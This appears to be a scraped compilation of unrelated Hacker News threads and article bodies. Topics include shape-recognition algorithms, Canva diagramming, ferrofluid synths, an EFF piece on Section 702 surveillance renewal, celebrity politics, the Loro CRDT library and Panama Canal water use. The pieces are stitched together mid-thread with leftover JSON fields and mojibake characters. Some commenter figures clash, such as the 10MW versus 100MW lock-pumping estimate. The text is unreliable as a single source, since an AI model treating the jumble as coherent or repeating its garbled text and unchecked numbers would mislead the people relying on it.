If you don&#x27;t draw the example shapes exactly, it confuses them. I recommend playing with \"delete\" versus \"x\" from the example shapes to see just how poorly this does. I could not get it to consistently differentiate between different drawing techniques.This would certainly get you started for gesture interfaces, where drawing a shape the same way every time is expected. It would not be a good fit for the use case here of diagramming. reply gurgunday 18 hours agoparentprevAgreed, it really works too well for how simple it is!We implemented it in ES6 as part of a uni project if anyone&#x27;s interested: https:&#x2F;&#x2F;github.com&#x2F;gurgunday&#x2F;onedollar-unistroke-es6 reply entropie 18 hours agorootparentI tried 4 different shapes (circle, rectangle, triangle and heart) and it always said \"Ellipse with score ...\". reply yathern 15 hours agorootparentFrom the README:> By default, it recognizes three shapes: Arrow, Check mark, and Ellipse.> You can add more templates by drawing them and clicking on the Add Template button.It worked well for the three - except a clockwise circle wouldn&#x27;t work, only a counter-clockwise. reply harunurhan 17 hours agorootparentprevit works really well if all you are drawing is an eclipse ¬Ø\\_(„ÉÑ)_&#x2F;¬Ø.

After all, if you can use massive amounts of compute to materialize what seems to be a good enough function approximator, why do advanced algorithms at all?Obviously the reason we should is that approximators like the NNs have explainability issues and corner case unpredictability issues plus they are bad at real world complexity (which is why self driving efforts continue to struggle even when exposed to a narrow subset of the real world). reply hospadar 16 hours agorootparentI think you&#x27;re right on about explainability and unexpected handling of corner cases - but I think one of the lessons from GOFAI is that handcrafted algorithms might look good in a lab, but rarely handle real-world complexity well at all. Folks worked for decades to try to make systems that did even a tiny fraction of what chatgpt or SD do and basically all failed.For safety stuff, justice-related decision-making, etc I think explainability is critical, but on the other hand for something like \"match doodle to controlled vocabulary of shapes\" (and tons of other very-simple-for-humans-but-annoyingly-hard-for-computers problems), why not just use the tiny model?Maybe if we get really good at making ML models we can make models that invent comprehensible algorithms that solve complex problems and can be tweaked by hand. Maybe if we discover that a problem can be reasonably well solved by a very tiny model, that&#x27;s a good indication that there is in fact a decent algorithm for solving that problem (and it&#x27;s worth trying to find the human-comprehensible algorithm). reply dist-epoch 18 hours agoparentprevI&#x27;ve just tried it, and it&#x27;s pretty bad, without training at least.My rectangle is recognized as a caret, my zigzag as curly bracket.And it doesn&#x27;t support drawing a shape in two strokes, like the arrow for example. reply verdverm 10 hours agorootparentThere&#x27;s no \"training\", it&#x27;s more of a data sample matching, akin more to these new vector databases than a neural network.

Years ago, Miro had a feature that converted your flailing attempts at drawing a star with a mouse into a geometrically precise star (or circle, or triangle, or whatever). I thought it was super cool, but then I never, ever needed to use it. I never need to do line drawing with my mouse: if I&#x27;m making diagrams, I just use pre-made shapes, which are faster. If I am making icons, I use a whole different process centered around Boolean operations and nudging points and the Pen tool‚Äîand I am probably using a dedicated program, like Illustrator, to do it. And if I am actually illustrating something (rarer these days than in times past) I have a tablet I will pull out. I am sure the tech here is cool, but what&#x27;s the use case? reply tobyjsullivan 15 hours agoparentCanva is not a diagraming tool. It‚Äôs a visual design tool with a very different user base.Their asset library is massive with millions, maybe tens of millions, of images including both photos and vector graphics.One of the more annoying parts of the tool - in my limited experience - is searching through an endless library for simple shapes when I already know exactly what I want. Presumably this tool aims to solve that pain point.Disclosure: worked there a few years ago.Edit: I suspect (zero inside info) this use case is important because they want to be a competitive diagraming tool as well. However, they‚Äôll be constrained in that they cannot fundamentally change the design experience for the other 99% of their current users. reply pc86 15 hours agoparentprev> but what&#x27;s the use case?Designers&#x2F;marketers who don&#x27;t learn keyboard shortcuts, for whom the comparison is \"drawing the shape with my mouth\" (quick) vs. \"going through upwards of a half dozen menus to pick the right shape, place it, then resize it\" (slower). Even if the shape is available w&#x2F;o going to any menus, drawing the entire thing with your mouth using a single cursor is going to be faster than placing and resizing a bunch of icons, switching to the arrow feature and adding the arrows in. reply karaterobot 14 hours agorootparentEvery designer I know (including myself) uses keyboard shortcuts like crazy.

So if you draw an almost straight line, you may have created 100 control points, and then the software simplifies it down to 4 points. reply steveruizok 10 hours agorootparentFor what it‚Äôs worth, perfect freehand (the library I wrote that they‚Äôre using for the digital ink) does not use B√©zier curves at all to determine the position of points or create the ‚Äústroke‚Äù polygon that wraps the input points. Curves are only used to draw the line around that stroke polygon.I tried to incorporate simplification into the perfect freehand algorithm but eventually gave up because I could not find any ‚Äústable‚Äù algorithm that would not cause the line to jump around as you drew &#x2F; added points to the end. As far as I know none exist. Most apps that use simplification solve this problem by simplifying the line only after you‚Äôve finished drawing, however for handwriting or artistic drawing this is especially bad as it ‚Äúundoes‚Äù legitimate decisions you‚Äôve made about where to place detail. In addition, the perfect-freehand algorithm simulates pressure based on density of points, so simplifying the line (ie removing points) without creating a corresponding pressure curve will cause a reduction in line variation, which is part of the fun of using it in the first place!I‚Äôd love to learn more about what the canva team has done here though.

That&#x27;s necessary on 1990&#x27;s hardware because drawing straight lines is fast, and you need to do it fast.Then, when you are done drawing, it redraws the line, using the same points as before, but this time as input to a spline curve algorithm.Drawing splines isn&#x27;t much harder computationally, but notably if you add one more point to the end of a spline curve, then part of the line that you have already drawn changes. That in itself is very computationally heavy, since everything behind that line now needs to be redrawn - certainly not something you can be sure can be done at 60 fps! reply steveruizok 10 hours agorootparentDrawing lines is faster than you think! The perfect-freehand algorithm that I wrote &#x2F; that canva is using here does not use splines but it does recompute the entire line on every frame. It‚Äôs fine at 60fps (and also fine at 120fps) up to a few thousand points on somewhat modern hardware before the paths get too slow to render. The algo itself is just blazing fast, in part because it does not rely on splines (which are much more complex).For an svg-style approach to ink (as opposed to a raster &#x2F; dab-style brush) there‚Äôs no other option than recomputing the whole line each time. As a bonus, you can adjust the properties after the fact very easily. (You can try that at perfectfreehand.com.) reply jaza 9 hours agorootparentprevI don&#x27;t deal with splines much, but when I do, I&#x27;m reticulating splines. reply freedomben 21 hours agoprevGreat article, and very interesting work.I&#x27;m surely in the minority, but I oddly find myself enjoying the hand-drawn \"shaky scribble\" versions more than the \"sleek vector graphic.\" I&#x27;m sure even my preference would be context dependent though, so even in my case it&#x27;s a cool feature.

Once you‚Äôve seen dancing animated black goo frolicking in space to sound, you never go back. Love Hult√©n has been plus-ing their custom instruments with ferrofluids, and the results are simply magical. From yesterday, there‚Äôs this beautiful creation with a KORG minilogue xd inside. (There‚Äôs also a Collider according to the notes, which I think is the Source Audio delay/reverb.) This isn‚Äôt the first time Love has added ferrofluids to a custom build. Over the summer, Love transformed a Twisted Electronics Deton8 into a ferrofluid-animated drum synth, with these delicious results: The inspiration for all of this, says Love, is DAKD Jung‚Äôs wondrous ferrofluid-display Bluetooth speaker project: Now, to be honest, I haven‚Äôt been keeping up with DIY ferrofluid sonic animations ‚Äì though seeing this, I wonder what I‚Äôve been doing with my life instead.

Something like a fully analog, polyphonic Jupiter-8 that still works 40 years after launch? Easily $20k+. A simple monophonic \"learner\" synth usually has one knob per function so it&#x27;s easier to learn how synthesis works at a fundamental level, so a lot of people start there.These are usually also priced for beginners, more or less, where a used Arturia Microbrute is about $200 and a used Korg Monologue is about $250. Then you can start getting into a lot of different design philosophies for everything in the middle. There are also a lot of digital hardware synths which tend to use frequency modulation so they can make some pretty crazy digital sounds.If you go completely mad with the power, people love building eurorack modular synths one module at a time.

    "originBody": "Section 702 is the controversial and much-abused mass surveillance authority that expires in December unless Congress renews it. EFF and others have been working hard to get real reforms into the law and have opposed a renewal, and now, we‚Äôre hearing about a rushed attempt to tie renewal to funding the government. We need to stop it. In September, President Biden signed a short-term continuing resolution to fund the government preventing a full shutdown. This week Congress must pass another bill to make sure it doesn‚Äôt happen again. But this time, we understand that Congress wants to vote on a \"clean\" renewal of Section 702‚Äîessentially, kicking the can down the road, as they've done before. The program was intended to collect communications of people outside of the United States, but because we live in an increasingly globalized world, the government retains a massive trove of communications between Americans and people overseas. Increasingly, it‚Äôs this U.S. side of digital conversations that domestic law enforcement agencies trawl through‚Äîall without a warrant. This is not how the government should work. Lawmakers should not take an unpopular, contested, and dangerous piece of legislation and slip it into a massive bill that, if opposed, would shut down the entire government. No one should have to choose between funding the government and renewing a dangerous mass surveillance program that even the federal government admits is in need of reform. EFF has signed onto a letter with a dozen organizations opposing even a short-term reauthorization of a program as dangerous as 702 in a piece of vital legislation. The letter says: ‚ÄúIn its current form, this authority is dangerous to our liberties and our democracy, and it should not be renewed for any length of time without robust debate, an opportunity for amendment, and ‚Äî ultimately ‚Äî far-reaching reforms. Allowing a short-term reauthorization to be slipped into a must-pass bill would demonstrate a blatant disregard for the civil liberties and civil rights of the American people.‚Äù For months, EFF and a large coalition of civil rights, civil liberties, and racial justice groups have been fighting the renewal of Section 702. Just last week, a group of privacy-minded Senators and Representatives introduced the Government Surveillance Reform Act, which would introduce some much-needed safeguards and oversight onto a historically out-of-control surveillance program. Section 702 is far too powerful, invasive, and dangerous to renew it cleanly as a matter of bureaucratic necessity and we say that it has to be renewed with massive reforms or not at all. Sneaking something this important into a massive must-pass bill is dishonest and a slap in the face to all people who care about privacy and the integrity of our digital communications.",

Put the pressure back on and vocalise the absurdity of the situation.

He has one ineffective charity in Chicago and otherwise all public action has revolved around showcasing his own struggles while simultaneously presenting himself as the solution to the world‚Äôs problems.Swift has been fairly vocal and ignited action around LGBTQ rights, women‚Äôs rights, sexual assault topics, and drastically improved voter turnout among her fans. reply mrangle 8 hours agorootparentRe: SwiftNone of those advocacies being effectively controversial &#x2F; MSM disfavored.

I mean AOC, Bernie, and Biden are fairly distinct politically but all \"left.\"I do think it is a reasonable complaint that you&#x27;re not using your platform to be a bit more specific and place a foot down rather than maintaining the air of ambiguity and generalizes. It is reasonable to interpret the latter as a political move rather than one of personal convictions, though they may be honest. But similarly one can see someone like her as having a lot to lose as well as seeing her have nothing to lose. Former because she can lose her yearly profits but latter because she&#x27;s a billionaire and so fucking rich that it&#x27;s pretty difficult for her to lose a billionaire lifestyle and it&#x27;s not like she&#x27;s going to lose all her fans no matter what she does. Of course she could be sued by her employers... But either way it does say how much she values her own convictions compared to the other things. Messy, but I don&#x27;t think unreasonable to call her out.FWIW I don&#x27;t know anything about Swift but I at least can say I haven&#x27;t heard of this controversy.

I&#x27;m not from the US, but from what i gather AOC&#x2F;Bernie would be considered centrists. Center-left would be the green party pushing actual (moderate) reform. And on the left you would have stuff like the communisty party, IWW and such.I mean, advocating for moderate social justice and redistribution of wealth is not \"left-wing\". It&#x27;s a principal component of social democrats even on the right. Even hardcore fascist rightwingers like De Gaulle or Hitler had to have some sort of social agenda and nobody ever thought to call them left-wing... reply hipadev23 7 hours agorootparentprevSwift was advocating for topics she felt passionate about and had some level of firsthand exposure.

But I agree, but I would refrain from asking Kanye to voice his concerns at this particular issue at this particular point in time. reply kmeisthax 10 hours agoparentprevCelebrities are about as ignorant about the issue as regular people, but there&#x27;s also millions of people vying for them to say stuff. So much so that it&#x27;s literally a commodity that they sell.Furthermore, celebrities often get pushback for making political statements, even extremely milquetoast ones like \"Israel shouldn&#x27;t collectively punish Palestine for Hamas\". Their job is to be liked by everyone, which means they can stand for nothing.That being said, I know of few people who actually support America&#x27;s current surveillance apparatus. Liberals hate it because it&#x27;s corrosive to liberal democracy; Trumpists hate it because it hurt them; and left-wingers hate it because they&#x27;re the intended target. The phrasing I use for this kind of issue is \"anti-partisan\": the general voting population hates it, but politicians want it to continue because it&#x27;s instrumental to other goals that the voting population would support.A key wrinkle is that most anti-partisanism would also disadvantage wealthy individuals if it got its way - i.e. right to repair harms OEMs&#x27; god-given right to force you to buy a new one - so wealth tends to rally around continuing the thing we don&#x27;t want. Celebrities are sort of in the wealth orbit insamuch as social capital and being well known is a saleable commodity, so they also have a tendency to orbit around opposing antipartisan issues.In other words, they don&#x27;t want the CIA to spy on them, but they also want a neoliberal economy to sell products into, which is growing increasingly unpopular, which requires having a CIA spy on extremists, which means they want the CIA to spy on someone else. None of this is consciously understood or planned, there&#x27;s no CIA guy telling celebrities to shut up about the spying, it is merely a coincidence of class interests and incentives. reply lern_too_spel 9 hours agoparentprevGiven how little people on this very forum understand Section 702, why would you think that Ye would understand it well enough to take an informed stand that is convincing to his followers? reply fallingknife 8 hours agoparentprev‚ÄúLet me tell you, you take on the intelligence community, they have six ways from Sunday at getting back at you,‚Äù- Senator Chuck Schumer reply mc32 9 hours agoparentprevI‚Äôd rather not have celebrities use their cultish followings to push for any cause, good or bad because they tend to be ignorant on the issues and only superficially attach themselves to some aspect. reply jauntywundrkind 9 hours agorootparentMental exercise: what if we then voted on the celebs, voting for and against the causes celebs put up?In my view, you&#x27;re gripe is that this system would be super shallow.

We already live in the world you describe.I&#x27;m proposing here a thought experiment where, rather than letting the public arena and media suss out how to play the story, let the cause go on indefinitely, the public gets a direct vote.My actual hope was the opposite of what you say: rather than leaving the media cycle around celebrities rumble on indefinitely, there&#x27;d be some discrete feedback events, checkin points where we can decide whether this de-facto cause celebre is - to borrow from a magazine - wired tired or expired. My hope was democracy might take power back from the 4th estate & celebrities. reply mc32 8 hours agorootparentprevMaybe a different take is you vote your tax contributions on the issues voted up for consideration.So by pop vote people vote their favorite causes (schools, roads, homeless shelters, prisons, climate, pensions, etc.) and as a taxpayer you can vote your dollars&#x2F;currency into any number of causes you can spread your tax contribution among. reply terminous 8 hours agorootparentprevHow about this: We have celebrities share their political views on a range of topics. The media will cover which celebrities say what positions, perhaps moderate a debate among them. The people then vote on their favorite celebrities, and those who are the most popular get to collectively vote on political decisions.

People support policies that are beneficial and don&#x27;t support policies that are harmful. Privacy is just one component of this evaluation. If we demand absolute privacy with no government oversight, even by warrants, the cost of increased crime will be larger than the marginal benefit from increased privacy.

    "title": "Loro: Introducing an Open-Source CRDTs Library for Efficient State Management and Synchronization",
    "originLink": "https://www.loro.dev/blog/loro-now-open-source",
    "originBody": "Blog Loro: Reimagine State Management with CRDTs Loro: Reimagine State Management with CRDTs 2023-11-13 by Zixuan ChenLiang Zhao Loro, our high-performance CRDTs library, is now open source loro-dev/loro . In this article, we share our vision for the local-first software development paradigm, explain why we're excited about it, and discuss the current status of Loro. With better DevTools, documentation, and a friendly ecosystem, everyone can easily build local-first software. You can build collaborative apps with time travel features easily using Loro. Play the example online (opens in a new tab). Envisioning the Local-First Development Paradigm Distributed states are commonly found in numerous scenarios, such as multiplayer games, multi-device document synchronization, and edge networks. These scenarios require synchronization to achieve consistency, usually entailing elaborate design and coding. For instance, considerations for network issues or concurrent write operations are necessary. However, for a wide range of applications CRDTs can simplify the code significantly: CRDTs can automatically merge concurrent writes without conflicts. Fewer abstractions. There's no need to design specific backend database schemas, manually execute expected conflict merges, or implement interfaces to memory and memory to persistent structure conversions. Offline supports are right out of the box What are CRDTs When you can't use CRDTs Since the data resides locally, client applications can directly access and manipulate local data, offering both speed and availability. Additionally, due to CRDTs' nature, synchronization / real-time collaboration can be achieved without relying on centralized servers (similar to Git, allowing migration to other platforms without data loss). With performance improvements, CRDTs increasingly replace traditional real-time collaboration solutions in various contexts. This represents a new paradigm. Local-first not only empowers users with control over their data, but also makes developers' lives easier. The annual growth rate of the \"local-first\" star count in GitHub has reached 40%+. Integrating CRDTs with UI State Management Loro's rich text collaboration example Since CRDTs enable conflict-free automatic merging, the challenge with using CRDTs shifts to \"how to express operations and states on CRDTs\". Front-end state management libraries often necessitate defining the retrieval of State and the specification of Actions, as illustrated by this example from Vue's state management tool, Pinia: export const useCartStore = defineStore({ id: \"cart\", state: () => ({ rawItems: [] as string[], }), getters: { items: (state): Array => state.rawItems.reduce((items, item) => { const existingItem = items.find((it) => it.name === item); if (!existingItem) { items.push({ name: item, amount: 1 }); } else { existingItem.amount++; } return items; }, [] as Array), }, actions: { addItem(name: string) { this.rawItems.push(name); }, removeItem(name: string) { const i = this.rawItems.lastIndexOf(name); if (i > -1) this.rawItems.splice(i, 1); }, async purchaseItems() { const user = useUserStore(); if (!user.name) return; console.log(\"Purchasing\", this.items); const n = this.items.length; this.rawItems = []; return n; }, }, }); This paradigm and CRDTs are easily compatible: The state in the state management libraries corresponds to CRDT types, and Action corresponds to a set of CRDT operations. Thus, implementing UI state management through CRDTs does not require users to change their habits. It also has many advanced features: Make states automatically synchronizable / support real-time collaboration. Like Git, maintain a complete distributed editing history. It can store an extensively large editing history with a low memory footprint and a compact encoding size. Below is an example. With this, you can effortlessly implement products with real-time / async collaboration and time machine features. Time travel a document with 360,000+ operations using Loro. To load the whole history and playback, it only takes 8.4MB in memory. And the entire history only takes 361KB in storage. The editing trace is from josephg/editing-traces . Introduction to Loro Loro is our CRDTs library, now open-sourced under a permissive license. We believe a cooperative and friendly open-source community is key to creating outstanding developer experiences. We aim to make Loro simple to use, extensible, and maintain high performance. The following is the latest status of Loro. CRDTs We have explored extensively, supporting a range of CRDT algorithms that have yet to be widely used. OT-like CRDTs Our CRDTs library is built on the brilliant concept of OT-like CRDTs from Seph Gentle's Diamond-type (opens in a new tab). Seph Gentle is currently writing a paper on it, which is worth looking forward to. Its notable features include reducing the cost of local operations, easier historical data reclamation, and sometimes lower storage and memory overhead. However, it relies on high-performance algorithms to apply remote operations. This design has great potential and we are excited about its future. Brief Introduction to OT-like CRDT algorithms Rich Text CRDTs In May of this year, we open-sourced the crdt-richtext (opens in a new tab) project, integrating the algorithms of the rich text CRDT Peritext by Ink&Switch (opens in a new tab) and the sequance CRDT Fugue by Matthew Weidner (opens in a new tab). A brief introduction to these two algorithms can be found in our blog at the time (opens in a new tab). Based on our experience from previous projects, we have integrated a rich text CRDT and Fugue into our framework in the current Loro. However, the biggest challenge was that Peritext did not integrate well with OT-like CRDTs (opens in a new tab). We have recently overcome this issue. We developed a new rich text CRDT algorithm that can run on OT-like CRDTs and has passed the capabilities listed in the Peritext paper's Criteria for rich text CRDTs, with no new issues revealed in our current million fuzzing tests. We will write an article in the future specifically to introduce this algorithm. Movable Tree We have also supported a movable tree CRDT. Synchronizing tree movements is often complex due to the potential for circular references. Addressing this issue in the distributed environment is even more challenging. We implemented Martin Kleppmann's paper, A Highly-Available Move Operation for Replicated Trees (opens in a new tab). The idea of this algorithm is to sort all move operations, ensuring the ordering is consistent across the replicas. Then, each operation is applied sequentially. If an operation would cause a circular reference, it has no effect. We found it to be elegant in design and also performant. The time complexity of local operations is O(k) (k being the average tree depth, as circular reference detection is required). For applying remote operations, which entails inserting new operations into the sorted list, we must undo operations that are subsequent in the ordering, apply the remote operation, and then redo the undone operations, with a cost of O(km) (m being the number of operations to undo). Visualization of applying a remote op Our tests show that local operations involving ten thousand random movements among a thousand nodes take less than 10ms (tested on an M2 MAX chip). Moreover, the cost of merging remote operations in this algorithm is similar to applying remote operations in OT-like CRDTs, making it adoptable. We've also experimented with log-spaced snapshots (opens in a new tab) and immutable data structure approaches in our movable-tree project (opens in a new tab), concluding that the undo + redo method is the fastest and the most memory-efficient. Data Structures Designing and experimenting with data structures is routine in Loro's development process. We previously open-sourced generic-btree (opens in a new tab) and have redesigned its structure for a more compact memory layout and cache-friendliness. Besides its remarkable performance, its flexibility enables us to support various information types required for Text, like utf16/Unicode code points/utf8, with minimal code. We also extensively reuse it to fulfill various requirements, highlighting Rust's impressive type expression capabilities. Internally, we've separated the document's state from its history (opens in a new tab). The state represents the current form of the document, akin to Git's HEAD pointer, while the document's history resembles the complete operation history behind Git. Hence, multiple document states can correspond to the same history. This structure simplifies our code and facilitates future support for version control. Most of our optimizations thus far have focused on text manipulations, historically one of the thorniest problems in CRDTs. In the future, we plan optimizations for a wider range of real-world scenarios. The Future We aim to reach version 1.0 by mid-next year, with much work to complete. Given our limited workforce, we will first provide a WASM interface for web developers to experiment with. Optimizing the WASM size is one of our goals for this phase. Much of our design work is still ongoing, and we plan to stabilize it in the next quarter, aiming for a simple yet powerful and flexible API. We welcome ideas and suggestions in our community discussions (opens in a new tab). There's also extensive documentation work to make working with Loro enjoyable. A potential indicator of success would be GPT generating sufficiently good code based on our documentation. Developing tools for developers is a challenging and exciting task. Many developer tools and visualization methods in front-end development are exceptionally good, and we hope to bring such experiences into the world of CRDTs and local-first development. DevTools will reveal CRDTs' hidden states and simplify control, making state maintenance and debugging a breeze. We also plan to support richer CRDT semantics, including Movable Lists and global undo/redo operations to support more diverse application scenarios. Seeking Collaborative Project Opportunities Our design and optimization efforts need feedback from real-world applications.

That way you can still refer to them from a positional perspective, but they will eventually disappear. The exact behavior depends on the implementation, the only requirement is that every \"user\" reaches the same state eventually. A: delete Line 4@marker B: append to the end of line 4@marker \"abcd\"could then result in either line 4 with only \"abcd\", or \"abcd\" at the beginning of line 5 (as long as both sides resolve to the same state). You&#x27;re right in that this is tricky to get right, as that is inherent to the complexity of asynchonous mutation from multiple sources. reply aatd86 2 hours agorootparentI guess my question is of whether the state that is being reached is a legit one in this case.What is the source of truth eventually?I think there must probably be a hierarchy that decides it.

As a developer, you get local-first performance and real-time sync between users. And it&#x27;s actually faster to ship an application without writing any APIs and just using the database directly.

So to limit the salt intrusion (through the new locks), they have to _not_ use the water saving basins, or flush the locks every now and then using a lot of fresh water from Gatun lake.This was (and is) not as much an issue with the old locks, as passage of ships there is ridiculously fast with the use of mules. With the new locks, it&#x27;s mostly tug boats, and substantially bigger&#x2F;slower ships obviously.[0] Mostly on the Agua Clara side.

The number of pumps, installation time, and power needed to run the locks (in both directions since the middle is at the top) would be huge. I could still happen, but take a decade to build out.The vertical rise is about 26meters and there are 3 10meter locks (33mx300m in size) in each direction. 40 ships travel through each day (~3ksec per fill bidirectional) and each fill is ~1Billion liters or 250Million gallons in less than an hour. Lifting 1B liters through 30m would need 100MW to power 100% efficient pumps continuously for leakless locks.

How did you do this calculation?? reply kurthr 12 hours agorootparentI did it myself, it&#x27;s about 10MW continuous assuming there are 40 ships each taking about 3000 seconds to traverse the locks. Each lock is ~30x330x10 cubic meters or 1Billion liters (conservatively).A Watt is 1 meter(lift) x 1 Newton &#x2F; second. There are 30 meters of lift. Each liter is 1kg and gravity (9.8m&#x2F;sec2) makes that about ~10 Newtons (9.8N due to gravity).So you get 10^9kg x 10N&#x2F;kg x 30m &#x2F; 3000 sec = 100MW continuous. That&#x27;s about 100, 000 horsepower. Each lock would need more than 16MW of pumping.Solar&#x2F;hydro power from the rain in lake Gatun is well over 100MW.

My engineering background means I‚Äôm fascinated by the surveying work that was undertaken before construction began. One map in particular shows proposed routes through Tehuantepec in Mexico, through lake Nicaragua, through a couple of different places in Panama and finally one using a river mostly in modern-day Colombia. The decision didn‚Äôt actually come down to the ‚Äúshortest‚Äù distance to dig as you might think, but primarily on how the mountain range through Central America would be dealt with. The final location chosen meant it was possible to create a huge in-land lake and use locks to elevate the ships 28 meters to that level.Really, really fascinating.

They should have had a couple hurricanes go through there. Sometimes you just don&#x27;t get the rain. AFAIK from news people freaking out every time there&#x27;s a hurricane (good source, I know) climate change is causing more of them. reply vkou 13 hours agorootparentprev1. Drought refers to lack of fresh water in a particular region. Sea level rise has next to no bearing on whether or not rain is going to fall in . A higher sea level does not meaningfully affect evaporation and precipitation rates.2. Most of the sea level rise expected from conservative[1] projections of climate change will be hitting us decades and centuries from now. Sea levels have only risen by ~8 inches since 1900, but even if we stopped emitting carbon tomorrow, we would have another 3 feet to look forward to by 2100, and 4.5 more feet by 2200.3. Storm surges[1], caused by stronger storms, caused by climate change can make low-lying coastal areas uninhabitable, without actually drowning them due to sea level rise.----[1] Less conservative projections are dismissed out-of-hand as alarmist, but seem to provide a better roadmap for reality than fairy tales, like the 2C warming that the Paris Accord promised us.[2] The sea level may have only gone up a few inches, but if an average worst-storm-of-the-year storm surge has gained a foot, it may be the difference between your house being fine, and having six inches of seawater in your living room for one day of every year. reply Consultant32452 12 hours agorootparentWould increasing global ocean and air temperatures lead to more water evaporating and a net increase in total rainfall of fresh water across the globe, even if it might also result in changes to where the rain falls? reply 4death4 12 hours agorootparentIt could, or it could lead to more water being held in the air and this less rainfall. reply vkou 10 hours agorootparentprevTemperature increases can indeed have that effect.Sea level rise, in itself, would not. reply mysterydip 13 hours agorootparentprevThanks! reply jacquesm 12 hours agorootparentprevNo, it makes perfect sense: more water in the oceans means less in circulation. reply marcosdumay 12 hours agorootparentIt&#x27;s less in ice.It&#x27;s also probably more in circulation.

An average of 200,000,000 L (52,000,000 US gal) of fresh water are used in a single passing of a ship.https:&#x2F;&#x2F;en.m.wikipedia.org&#x2F;wiki&#x2F;Panama_Canal reply mongol 13 hours agorootparentprevNo the Panama canal passes through freshwater, and you cannot let seawater enter for ecological reasons. reply HnUser12 13 hours agorootparentprevSomeone else linked this video and definitely helped me understand betterhttps:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=jh79YSCC8mM reply ProfessorLayton 12 hours agorootparentI know the video covered that it has been tried before, but it seems like the long term solution would be to actually excavate and connect the seas. We have much better excavation technology, and would allow for much, much higher throughput than this elaborate contraption subject to climate change. reply marssaxman 10 hours agorootparentIf you look at the example of the Suez canal, where some 700 species from the Red Sea have now colonized the eastern Mediterranean, the idea of directly connecting the Pacific and the Caribbean sounds like an environmental disaster. Not to mention the difference in sea level - there would be a lot of water flowing west to east before that balanced out, and raising the sea level in the Caribbean does not seem likely to make anyone happy. reply ProfessorLayton 9 hours agorootparentWhile I don&#x27;t disagree with the environmental concerns, ships use HFO (a very dirty type of fuel that&#x27;s essentially tar) and account for ~3% of all greenhouse gasses. It may be a net win overall if a proper canal can save many more ships thousands of miles of emissions per trip.The Caribbean is facing seal level rise anyway if we don&#x27;t find a way to reduce emissions. Again I&#x27;m not an expert on this subject, but it doesn&#x27;t seem cut and dry that a canal would be an environmental disaster if it were possible to excavate. reply AlotOfReading 12 hours agorootparentprevThe seas aren&#x27;t at the same elevation. The Pacific is a couple dozen cm higher than the Atlantic Coast, and the amount varies. Cutting the peninsula would turn into a disaster pretty quickly, even with sci fi excavation technology. reply jacquesm 12 hours agorootparentI&#x27;m not so sure that it would make such a huge difference that it would be an immediate disaster, across that kind of distance there are plenty of examples of more elevation, what you would have is a river flowing one way instead of two rivers flowing towards the see. Not unlike any other island that the sea flows around.Or is there something in particular that would make this connection into a disaster area if that flow got started?The length of the canal is about 75 km, a few dozen cm across that distance would be on the order of 0.04 mm &#x2F; meter, which is barely enough to make water flow in a particular direction. reply AlotOfReading 9 hours agorootparentIt&#x27;d be highly susceptible to erosion, and the channel wouldn&#x27;t be stable. It&#x27;d either expand gradually over time with all sorts of ecological ramifications, or deposition would clog the channel constantly. Who knows, might do both depending on seasonal factors? Imagine the damage a hurricane might do to those massive cliffs, for example. reply jacquesm 9 hours agorootparentThat all sounds quite different from an immediate disaster. Those things apply to any river and those typically have a slope well in excess of that. Not that I would argue in favor of cutting a channel between the two but it doesn&#x27;t sound as though this is an insurmountable problem, basically well within the elevation difference that even a single minor lock would be able to handle.You might even have to add a pumping system to the lock to ensure that it would fill up fast enough. reply AlotOfReading 7 hours agorootparentTides would take care of the filling. The Pacific tidal range is something like +-6.5m, the Atlantic side isit&#x27;s not entirely unreasonable to say \"hey these two might be related\" until new evidence and computer modeling is done.No it&#x27;s not. But in practice that sort of relation seems to have about a 10% chance of being an actual casual relationship.> Regardless of how fuzzy the evidence is, saying that any given weather event is \"caused by climate change\" is still a safe bet.When there is fuzzy evidence that X causes Y it is not safe to say \"X causes Y\" and I&#x27;m not willing to concede an exception to this when X = climate change. reply nemo44x 13 hours agorootparentprevCorrect - this has nothing to do with it.Droughts happen.

The canals were built for a different world, before there were containers and giant ports for offloading.Serious question, surely it&#x27;s expensive to unload but so is waiting for the canal. For some loads it seems like it&#x27;d make sense to bridge the oceans using rail. reply cranky908canuck 9 hours agorootparentIt could be cheaper than the typical container port, if you can co-ordinate the ships: the Rustbucket Pacific unloads to a train&#x2F;series of trains that carry the containers to the waiting Rustbucket Atlantic at the other end. No need to sort out destinations at the individual container level.This does mean that you would like to work with the same shipping line at both ends, to address the matching of ship capacities. reply userbinator 10 hours agorootparentprevFor some interesting weight comparisons:https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;List_of_largest_machinesThe ships look like they&#x27;re over an order of magnitude heavier than anything on land. reply klyrs 9 hours agorootparentThat is an interesting comparison.By my calculation, \"The Captain\" is just under 5 tons per square meter. Contrast that to the neopanamax, almost 6.5 tons per square meter (some uncertainty here -- I&#x27;m going by DWT which apparently doesn&#x27;t contain the ship itself). So yeah, it&#x27;s certainly heavier, but the areal density isn&#x27;t an order of magnitude greater. reply wizzwizz4 12 hours agorootparentprevSo make them as big as the infrastructure supports?

Without further information, it&#x27;s a promising alternative that is very obviously limited by the (area) density of those ships, but obviously a major investment. Somehow, the ship is able to sustain its weight, so it&#x27;s not an absurd idea, but they can just barely sustain it, so it&#x27;s only a just barely not absurd of an idea. reply qup 9 hours agorootparentwe&#x27;ll put a portable pool on the rails. float em across. it only increases the complexity a little. reply hef19898 1 hour agorootparentTypical HN idea, sorry.

It&#x27;s not practical to pump that much water up hill, so we&#x27;re at nature&#x27;s mercy for the water supply.If there isn&#x27;t enough water in the system to operating the existing locks, there&#x27;s no point adding a parallel set to draw from the same limited water supply. reply cobbal 13 hours agorootparentprevIf the limiting factor is rainwater into the central lake, draining the lake in two different paths won&#x27;t help anything. reply ta1243 13 hours agorootparentHow much to pump the water back (either fresh water from the bottom lock or replace the whole flight with salt)?200,000 tons of water per ship, 26 metres above sea level, about 200MWh, so call it 500MWh.

    "originLink": "https://peergos.org/posts/blake3",
